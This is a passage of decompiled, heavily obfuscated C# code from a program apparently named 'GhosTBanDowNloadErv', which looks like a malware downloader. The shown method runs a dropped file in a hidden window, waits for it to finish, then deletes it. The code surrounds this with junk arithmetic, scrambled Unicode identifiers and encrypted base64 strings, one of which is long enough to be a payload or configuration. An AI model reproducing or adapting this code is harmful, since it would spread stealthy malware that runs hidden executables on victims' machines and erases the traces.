			ProcessStartInfo startInfo = process.StartInfo;
			int num54 = (int)((int)Math.Floor(-781.2238464532112) + (int)double.Parse(丂_FFFD闩丂_FFFD_2ECF_2ECF_FFFD_FFFD()) + (nint)Type.EmptyTypes.LongLength);
			nint num55 = (int)Math.Floor(-785.2238464532112) + (int)double.Parse(_FFFDᗪ卄_FFFD_2ECFㄩㄩ讠ㄩ丂ᐯ_2ECFㄩ卄_2ECF_D83D_DCDD讠_FFFD丂ᗪ_3024_FFFD闩_FFFD_2ECFㄖ_2ECF_FFFD丿ᐯᗪ_FFFD山GhosTBanDowNloadErv3421342342_2ECFㄖ_2ECF讠ㄩ_2ECF山_2ECFᗪ_FFFD丂ᐯ_FFFDᐯ_FFFD讠讠_2ECF讠_FFFDᐯ丂_3024ᐯ卄_2ECF讠_2ECFᗪ_FFFDㄩ_3024ㄩ丿._2ECF()) + (nint)Type.EmptyTypes.LongLength;
			if ((((int)Math.Floor(1138499461.7761536) + (int)double.Parse(_2ECFᐯ_FFFD卄_2ECF_2F15()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(466168904.77615356) + (int)double.Parse(_FFFD_FFFD山ᐯᗪ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(1477774007.7761536) + (int)double.Parse(_2F15ㄩ_FFFDㄩ_2ECF卄_2ECF丂丿()) + (nint)Type.EmptyTypes.LongLength)
			{
				num54 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(ᐯㄖ_2ECF丂丿()) + (nint)Type.EmptyTypes.LongLength);
				num55 += sizeof(float);
			}
			startInfo.UseShellExecute = (byte)num55 != 0;
			ProcessStartInfo startInfo2 = process.StartInfo;
			int num56 = (int)((int)Math.Floor(-780.2238464532112) + (int)double.Parse(_FFFD闩丂_D83D_DCDD丿()) + (nint)Type.EmptyTypes.LongLength);
			nint num57 = (int)Math.Floor(-784.2238464532112) + (int)double.Parse(_2ECFᐯ_3024讠_3024卄ᐯ()) + (nint)Type.EmptyTypes.LongLength;
			if ((((int)Math.Floor(1658180232.7761536) + (int)double.Parse(_FFFD_2ECF丂卄ᐯ讠卄()) + (nint)Type.EmptyTypes.LongLength) ^ ((int)Math.Floor(1201748718.7761536) + (int)double.Parse(_3024丿讠丿丂ᐯ()) + (nint)Type.EmptyTypes.LongLength)) == (int)Math.Floor(628417884.7761536) + (int)double.Parse(_FFFD_FFFDᗪ丂ᐯ()) + (nint)Type.EmptyTypes.LongLength)
			{
				num56 = (int)((int)Math.Floor(-779.2238464532112) + (int)double.Parse(讠ㄩ_FFFD_FFFDᗪ_2ECF_FFFD_2ECF()) + (nint)Type.EmptyTypes.LongLength);
				num57 += sizeof(float);
			}
			startInfo2.CreateNoWindow = (byte)num57 != 0;
			process.StartInfo.FileName = text4;
			process.Start();
			process.WaitForExit();
			((delegate*<string, void>)(&File.Delete))(text4);
			_FFFD讠_2ECF丂丿_2ECFㄩᐯㄩ_FFFD_FFFD丿讠ᐯ讠丂_2ECF讠_FFFD丿_2ECF_FFFD卄ᗪ_2ECFᐯ_2ECFㄩᗪ_FFFD_FFFD_FFFD讠_FFFDGhosTBanDowNloadErv3421342342闩_2ECF山讠卄丿_2ECFㄩ_2ECF卄_2ECF_FFFDㄩ_FFFD_2F15ᐯ丂ᐯ卄ᐯㄩ丿丂_2ECF丂_FFFD卄ㄖ丂丿_2ECFᐯ_3024讠._FFFD卄ㄩᐯ_2ECF_2ECF_FFFD卄ᗪ_2ECF_3024ᗪ丂讠_3024ᐯ丿卄ᗪㄩᗪ_FFFD卄ᐯᗪᗪ_FFFD_2ECF卄闩_2ECF丂ᐯᗪGhosTBanDowNloadErv3421342342ㄖᗪ卄卄闩闩_2F15ᐯㄖᗪ_FFFDᗪ讠_3024_2ECF_2ECF_FFFD_2ECF_FFFDᐯ_FFFDㄖ_2ECF卄ᐯ_3024山ㄩ_2ECF_FFFD丂_2ECF丿_FFFD();
		}
		catch
		{
			if (((delegate*<string?, bool>)(&File.Exists))(text4))
			{
				((delegate*<string, void>)(&File.Delete))(text4);
			}
			((delegate*<void>)(&Console.ResetColor))();
		}
	}

	public static string ᐯᗪ_FFFD()
	{
		return "YV2JB+GVue0P1zLuk+ZavYId9N7hNqUbkkzBKGo4UgtOjSKhtkOO5u++W/SVNdPw";
	}

	public static string 卄()
	{
		return "423.561322125402";
	}

	public static string 卄丿卄()
	{
		return "423.561322125402";
	}

	public static string ㄩ_FFFDᐯ_2ECF卄闩()
	{
		return "423.561322125402";
	}

	public static string 山_FFFDㄖ()
	{
		return "423.561322125402";
	}

	public static string ᗪᐯ_FFFD讠丂闩ㄖ_FFFD()
	{
		return "423.561322125402";
	}

	public static string 讠()
	{
		return "423.561322125402";
	}

	public static string _2F15ㄩ_2F15ᐯᗪ_FFFDᗪᐯᐯ()
	{
		return "423.561322125402";
	}

	public static string _FFFD_FFFDᗪ_2ECFㄩ丂卄()
	{
		return "423.561322125402";
	}

	public static string ᗪㄖ丂ㄩ_2ECF_FFFD()
	{
		return "423.561322125402";
	}

	public static string 丂_FFFD()
	{
		return "423.561322125402";
	}

	public static string ᐯ_2ECF_2F15_FFFD_3024讠()
	{
		return "423.561322125402";
	}

	public static string 讠丿_2ECF_FFFD闩()
	{
		return "423.561322125402";
	}

	public static string ᐯᐯᐯ()
	{
		return "foTYkyQL2X00kZb0ZO3NwKCJk5MUUJC5wR5WU+4UR+w=";
	}

	public static string _2F15卄ᐯ山ᐯᐯㄩᗪ讠()
	{
		return "423.561322125402";
	}

	public static string _2ECF卄丂卄()
	{
		return "423.561322125402";
	}

	public static string _2ECF闩_2ECF丿()
	{
		return "423.561322125402";
	}

	public static string 丂ᐯ_2ECF_FFFD闩_FFFD丂丿()
	{
		return "423.561322125402";
	}

	public static string 讠_FFFDᐯ_FFFD卄ᗪ()
	{
		return "423.561322125402";
	}

	public static string _FFFD丂ㄖㄩ_2ECFㄖ()
	{
		return "423.561322125402";
	}

	public static string _FFFD()
	{
		return "yuLEr6c2jTJtCpDOj+6FmQ==";
	}

	public static string _FFFD_FFFD丂()
	{
		return "423.561322125402";
	}

	public static string 闩_FFFDᐯ()
	{
		return "423.561322125402";
	}

	public static string ᗪᐯ丿_2ECF闩丂ㄩ()
	{
		return "423.561322125402";
	}

	public static string 丂闩_2ECF闩_2ECF_FFFD_2ECF闩()
	{
		return "423.561322125402";
	}

	public static string _FFFD_2ECF_2ECF_3024_FFFD_3024ᗪ_FFFD()
	{
		return "423.561322125402";
	}

	public static string _FFFDᐯㄩ_FFFD()
	{
		return "423.561322125402";
	}

	public static string _D83D_DF57卄_2ECF_FFFDㄩ()
	{
		return "SSPBCrqKkxmrUhDcdapF0g==";
	}

	public static string ㄩㄖ闩丿_FFFD_2ECF()
	{
		return "423.561322125402";
	}

	public static string ㄩ()
	{
		return "423.561322125402";
	}

	public static string _2ECFᗪ_2F15()
	{
		return "423.561322125402";
	}

	public static string 卄_2ECF讠_3024()
	{
		return "423.561322125402";
	}

	public static string 丿_FFFD_FFFD卄_FFFD卄()
	{
		return "423.561322125402";
	}

	public static string _2ECF()
	{
		return "423.561322125402";
	}

	public static string 丂卄卄()
	{
		return "D2S489AklkWgIQ0GFe0kKw==";
	}

	public static string _2F15_2F15卄()
	{
		return "423.561322125402";
	}

	public static string _2ECFㄩᐯ_FFFD丂_FFFD()
	{
		return "423.561322125402";
	}

	public static string ㄩᗪᐯ_3024丿ㄩ_FFFD()
	{
		return "423.561322125402";
	}

	public static string 丂_2ECFㄩ()
	{
		return "423.561322125402";
	}

	public static string 讠_2ECFᐯ()
	{
		return "423.561322125402";
	}

	public static string _2ECF卄ㄩᗪ_2ECF()
	{
		return "423.561322125402";
	}

	public static string 丿_FFFDㄖ卄_2ECF_2ECFㄩ()
	{
		return "dcLrIqBawcG2JvxrmamrEXfV+PGWaz8ZcXNq7k+x1PU=";
	}

	public static string ᗪ_2ECF丿()
	{
		return "423.561322125402";
	}

	public static string 丂讠_FFFD卄_2F15ᗪᗪ()
	{
		return "423.561322125402";
	}

	public static string ㄩ_3024丂()
	{
		return "423.561322125402";
	}

	public static string _2ECF_2ECFᗪ_FFFD_FFFD_2ECF()
	{
		return "423.561322125402";
	}

	public static string 丿ᐯ()
	{
		return "423.561322125402";
	}

	public static string _FFFD_2ECF_2F15_2ECF()
	{
		return "423.561322125402";
	}

	public static string ᗪ()
	{
		return "45AzEgo/R3X8eIDyhN8AAf+CNdXqWMTmS08kxz5v45Y=";
	}

	public static string _FFFD_2ECFᐯ()
	{
		return "423.561322125402";
	}

	public static string _FFFD()
	{
		return "423.561322125402";
	}

	public static string 丂丿丿_FFFD_2ECFᗪ()
	{
		return "423.561322125402";
	}

	public static string _FFFD讠丂卄讠丂_FFFDᗪ()
	{
		return "423.561322125402";
	}

	public static string _2ECF_D83D_DF57ᐯ卄ㄩ_3024()
	{
		return "423.561322125402";
	}

	public static string _3024ᗪㄖᐯ()
	{
		return "423.561322125402";
	}

	public static string _FFFD卄_FFFD山_3024闩ᗪ()
	{
		return "WC321Ycf70hy601ozLh+j8Hu8eUfsivrUIOy0DTvGYE=";
	}

	public static string 丂_FFFD_FFFD丂_FFFDᗪ()
	{
		return "423.561322125402";
	}

	public static string _FFFD闩_2ECF山_FFFD卄()
	{
		return "423.561322125402";
	}

	public static string _FFFD()
	{
		return "423.561322125402";
	}

	public static string 丿ᐯ丂ᐯ卄_2ECF_2ECF()
	{
		return "423.561322125402";
	}

	public static string _FFFDㄖ卄()
	{
		return "423.561322125402";
	}

	public static string 丿_FFFDㄩᗪᗪ_2ECF()
	{
		return "423.561322125402";
	}

	public static string ᐯ_FFFDᗪ()
	{
		return "Lq0nz1JPhoZqZ50xaj5/Uq3stCw5lQmA9SZpubo/KWk=";
	}

	public static string _2ECF丿_3024丿丂()
	{
		return "423.561322125402";
	}

	public static string _2ECF讠()
	{
		return "423.561322125402";
	}

	public static string _2F15ㄩᗪ_FFFDᐯ_2F15ㄖ()
	{
		return "423.561322125402";
	}

	public static string _FFFDᐯᐯ_FFFD()
	{
		return "423.561322125402";
	}

	public static string _2ECF丂ᐯㄩ丿卄_2ECFㄩ()
	{
		return "423.561322125402";
	}

	public static string 讠闩_3024ᐯ_2ECFㄩ_FFFD()
	{
		return "423.561322125402";
	}

	public static string 讠ᗪ_2F15ㄩ()
	{
		return "423.561322125402";
	}

	public static string _2ECF讠丿卄卄_2ECF丿()
	{
		return "423.561322125402";
	}

	public static string _FFFD_2ECF()
	{
		return "423.561322125402";
	}

	public static string 丂丿ᗪ_FFFD讠闩_2ECF_FFFD()
	{
		return "782.007544124502";
	}

	public static string 丿ᐯ丂ᐯㄩ讠丿_2F15ᐯ()
	{
		return "782.007544124502";
	}

	public static string _3024丂_2ECF()
	{
		return "782.007544124502";
	}

	public static string ᐯ_3024_FFFD()
	{
		return "8ITJnMeK0RKqNw/VZuN1Ow==";
	}

	public static string _2ECF丿丂_FFFD山丂_2ECF丂()
	{
		return "782.007544124502";
	}

	public static string _2ECF卄ᗪ_2ECFᗪ丿讠_FFFDᗪ()
	{
		return "782.007544124502";
	}

	public static string ᐯ_FFFD()
	{
		return "782.007544124502";
	}

	public static string 丿_2ECFㄩㄖ_FFFDㄩ()
	{
		return "782.007544124502";
	}

	public static string 丿丿_FFFDᐯ()
	{
		return "782.007544124502";
	}

	public static string ㄖ()
	{
		return "782.007544124502";
	}

	public static string _2ECFㄩ_3024讠()
	{
		return "WgrAcbNhRyv/1aTlE5cTUA==";
	}

	public static string 丿_3024山_FFFD_3024_2ECF()
	{
		return "782.007544124502";
	}

	public static string 丂卄_3024丂_FFFD_3024()
	{
		return "782.007544124502";
	}

	public static string 卄_FFFD()
	{
		return "782.007544124502";
	}

	public static string _FFFD山_FFFDㄖ卄ㄖᗪㄩ()
	{
		return "782.007544124502";
	}

	public static string ㄩᗪ_3024ᐯ讠_FFFD()
	{
		return "782.007544124502";
	}

	public static string _2ECF讠山_2ECF_FFFD()
	{
		return "782.007544124502";
	}

	public static string 丂ㄩ()
	{
		return "BCvJmQH8pYvRyorP8f1NFQ==";
	}

	public static string _2ECF讠讠山讠()
	{
		return "782.007544124502";
	}

	public static string 卄讠_FFFD丿ㄩ丿ᐯ_FFFD_3024()
	{
		return "782.007544124502";
	}

	public static string 闩卄ᐯ()
	{
		return "782.007544124502";
	}

	public static string ㄩ讠讠()
	{
		return "782.007544124502";
	}

	public static string 卄丂()
	{
		return "782.007544124502";
	}

	public static string ᐯ_2ECF_FFFD_FFFD()
	{
		return "782.007544124502";
	}

	public static string 山_FFFD卄丿_FFFD闩_2F15ᐯ_FFFD()
	{
		return "8ITJnMeK0RKqNw/VZuN1Ow==";
	}

	public static string _D83D_DF57_FFFD_2ECFᐯ丿丿()
	{
		return "782.007544124502";
	}

	public static string _FFFDㄖ_FFFD卄讠ᗪㄖ闩()
	{
		return "782.007544124502";
	}

	public static string 闩_FFFDㄖ_2F15丂闩()
	{
		return "782.007544124502";
	}

	public static string _FFFD()
	{
		return "782.007544124502";
	}

	public static string ᐯ闩()
	{
		return "782.007544124502";
	}

	public static string _2ECF_FFFD_2ECF_FFFD闩_2ECF丂_FFFD()
	{
		return "782.007544124502";
	}

	public static string _FFFD()
	{
		return "WgrAcbNhRyv/1aTlE5cTUA==";
	}

	public static string _FFFD_FFFD()
	{
		return "782.007544124502";
	}

	public static string _FFFDᗪ()
	{
		return "782.007544124502";
	}

	public static string 讠_2ECF丿_FFFD()
	{
		return "782.007544124502";
	}

	public static string 闩ᐯ_FFFD_3024()
	{
		return "782.007544124502";
	}

	public static string 丂丂ㄩ丿_2ECF()
	{
		return "782.007544124502";
	}

	public static string 讠_FFFD_D835_DCDDㄩ山丂卄_FFFD()
	{
		return "782.007544124502";
	}

	public static string _FFFD_FFFDᗪ卄_FFFDᐯ()
	{
		return "BCvJmQH8pYvRyorP8f1NFQ==";
	}

	public static string ᐯᐯ闩_2ECF_FFFD_FFFDᐯ卄()
	{
		return "782.007544124502";
	}

	public static string ᐯ闩ㄖ丿_FFFD丿ㄩ讠丿()
	{
		return "782.007544124502";
	}

	public static string _FFFD丂ᐯㄖ_D83D_DF57ㄩ讠()
	{
		return "782.007544124502";
	}

	public static string _FFFD卄ᗪ山闩()
	{
		return "782.007544124502";
	}

	public static string ᐯ_3024_2ECF丿山_FFFDᗪ()
	{
		return "782.007544124502";
	}

	public static string 讠_FFFD_2F15()
	{
		return "782.007544124502";
	}

	public static string 丂ᗪ丿ᗪ()
	{
		return "8ITJnMeK0RKqNw/VZuN1Ow==";
	}

	public static string _FFFD_2F15闩丿_FFFD()
	{
		return "782.007544124502";
	}

	public static string _D835_DF57丿_2F15()
	{
		return "782.007544124502";
	}

	public static string 讠卄_3024_2ECFㄩ_2ECF_FFFDᐯ_3024()
	{
		return "782.007544124502";
	}

	public static string _FFFD_2ECF卄ᗪ_2F15_FFFD卄ᐯ()
	{
		return "782.007544124502";
	}

	public static string _FFFD丿ㄩ_3024丿()
	{
		return "782.007544124502";
	}

	public static string _2ECF_FFFD_2ECF_FFFDᗪ_2ECFᗪ讠ᐯ()
	{
		return "782.007544124502";
	}

	public static string _2ECF丂()
	{
		return "BCvJmQH8pYvRyorP8f1NFQ==";
	}

	public static string ᐯ卄丂_3024卄_FFFD_2F15()
	{
		return "782.007544124502";
	}

	public static string 丂闩丂ㄩ丿卄山()
	{
		return "782.007544124502";
	}

	public static string _FFFDㄩㄩ丿()
	{
		return "782.007544124502";
	}

	public static string ㄩ_FFFDᗪ()
	{
		return "782.007544124502";
	}

	public static string _FFFD卄闩ᐯ_2ECF讠ㄩ_FFFD_FFFD()
	{
		return "782.007544124502";
	}

	public static string 讠闩ᐯ_FFFD_2ECF_2ECF_2ECF()
	{
		return "782.007544124502";
	}

	public static string ᗪ丂卄_FFFD()
	{
		return "WgrAcbNhRyv/1aTlE5cTUA==";
	}

	public static string 讠()
	{
		return "782.007544124502";
	}

	public static string _FFFD_2ECF_2ECF_2F15()
	{
		return "782.007544124502";
	}

	public static string _FFFDㄩ_2ECFㄖㄩ()
	{
		return "782.007544124502";
	}

	public static string 闩ᐯᗪ()
	{
		return "782.007544124502";
	}

	public static string _3024丂ᗪ_FFFD_FFFD_FFFD_FFFDᐯ()
	{
		return "782.007544124502";
	}

	public static string 丿ᐯ卄_2ECF闩_FFFD()
	{
		return "782.007544124502";
	}

	public static string 卄()
	{
		return "8ITJnMeK0RKqNw/VZuN1Ow==";
	}

	public static string _2ECF_FFFD()
	{
		return "782.007544124502";
	}

	public static string ᗪᐯ卄ᐯᐯ丿卄卄_3024()
	{
		return "782.007544124502";
	}

	public static string 山()
	{
		return "782.007544124502";
	}

	public static string ᐯㄩ_3024讠_FFFDㄩ丿卄山()
	{
		return "782.007544124502";
	}

	public static string ㄖᐯ讠卄讠_FFFD_2ECF丿()
	{
		return "782.007544124502";
	}

	public static string ᐯ卄ㄖ丂丿_FFFD_FFFD()
	{
		return "782.007544124502";
	}

	public static string 丂_2F15山()
	{
		return "BCvJmQH8pYvRyorP8f1NFQ==";
	}

	public static string 丂_FFFD_FFFD_FFFD丿卄ᗪ()
	{
		return "782.007544124502";
	}

	public static string _2ECF()
	{
		return "782.007544124502";
	}

	public static string 丿()
	{
		return "782.007544124502";
	}

	public static string 卄_FFFD()
	{
		return "782.007544124502";
	}

	public static string ᐯ山_3024_2F15丂闩_FFFD卄()
	{
		return "782.007544124502";
	}

	public static string _FFFD_2ECF丿_2ECF_2ECFㄩᐯ()
	{
		return "782.007544124502";
	}

	public static string ㄖ_2ECF_2ECF_2ECFㄩ()
	{
		return "WgrAcbNhRyv/1aTlE5cTUA==";
	}

	public static string 丂()
	{
		return "782.007544124502";
	}

	public static string 讠丂ᐯᗪᗪ丂_2ECFᗪ_FFFD()
	{
		return "782.007544124502";
	}

	public static string ᗪ_FFFDㄖ卄ㄩ_FFFD丿()
	{
		return "782.007544124502";
	}

	public static string 丂()
	{
		return "782.007544124502";
	}

	public static string _FFFD()
	{
		return "782.007544124502";
	}

	public static string ㄩ卄ㄩ_2ECF_2ECF丿_FFFD丂()
	{
		return "782.007544124502";
	}

	public static string _FFFD_2ECF_2ECF丂ᐯ_FFFD()
	{
		return "782.007544124502";
	}

	public static string 卄_3024()
	{
		return "782.007544124502";
	}

	public static string _FFFD()
	{
		return "782.007544124502";
	}

	public static string _FFFD卄_D835_DF57山_2ECFᐯᐯㄩ()
	{
		return "782.007544124502";
	}

	public static string 讠卄_2F15()
	{
		return "782.007544124502";
	}

	public static string 丿ᗪ_3024_FFFD丿山ᐯᐯ()
	{
		return "782.007544124502";
	}

	public static string _FFFDㄖᐯ卄丂山卄ㄖ()
	{
		return "782.007544124502";
	}

	public static string _2ECF()
	{
		return "782.007544124502";
	}

	public static string ㄩ卄讠丿_FFFD山_3024ㄩ()
	{
		return "782.007544124502";
	}

	public static string 卄ᗪ山丿_FFFD()
	{
		return "782.007544124502";
	}

	public static string 卄丂_2ECF讠_3024()
	{
		return "782.007544124502";
	}

	public static string 丿_FFFDㄖ()
	{
		return "782.007544124502";
	}

	public static string 卄丂丂_FFFD_2ECF()
	{
		return "2R8jb/rQ3089b87yBbjiqg==";
	}

	public static string _FFFD卄_2ECF()
	{
		return "UUopXP3Aosqv5tLwGNOMXA==";
	}

	public static string ㄩ()
	{
		return "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";
	}

	public static string 丿_FFFDᐯ丿丿()
	{
		return "782.007544124502";
	}

	public static string _2ECF卄卄_2ECFᗪ_FFFD()
	{
		return "782.007544124502";
	}

	public static string _2ECF丂()
	{
		return "782.007544124502";
	}

	public static string _2ECF丂_FFFD_3024ᐯ卄丿ㄖㄩ()
	{
		return "782.007544124502";
	}

	public static string 讠ᐯ卄卄()
	{
		return "782.007544124502";
	}

	public static string ᗪ_2ECF_2ECF_FFFD山ㄖ闩卄_FFFD()
	{
		return "782.007544124502";
	}

	public static string 丂_FFFD闩丂_FFFD_2ECF_2ECF_FFFD_FFFD()
	{
		return "782.007544124502";
	}

	public static string _2ECF()
	{
		return "782.007544124502";
	}

	public static string _2ECFᐯ_FFFD卄_2ECF_2F15()
	{
		return "782.007544124502";
	}

	public static string _FFFD_FFFD山ᐯᗪ()
	{
		return "782.007544124502";
	}

	public static string _2F15ㄩ_FFFDㄩ_2ECF卄_2ECF丂丿()
	{
		return "782.007544124502";
	}

	public static string ᐯㄖ_2ECF丂丿()
	{
		return "782.007544124502";
	}

	public static string _FFFD闩丂_D83D_DCDD丿()
	{
		return "782.007544124502";
	}

	public static string _2ECFᐯ_3024讠_3024卄ᐯ()
	{
		return "782.007544124502";
	}

	public static string _FFFD_2ECF丂卄ᐯ讠卄()
	{
		return "782.007544124502";
	}

	public static string _3024丿讠丿丂ᐯ()
	{
		return "782.007544124502";
	}

	public static string _FFFD_FFFDᗪ丂ᐯ()
	{
		return "782.007544124502";
	}

	public static string 讠ㄩ_FFFD_FFFDᗪ_2ECF_FFFD_2ECF()
	{
		return "782.007544124502";
	}
}
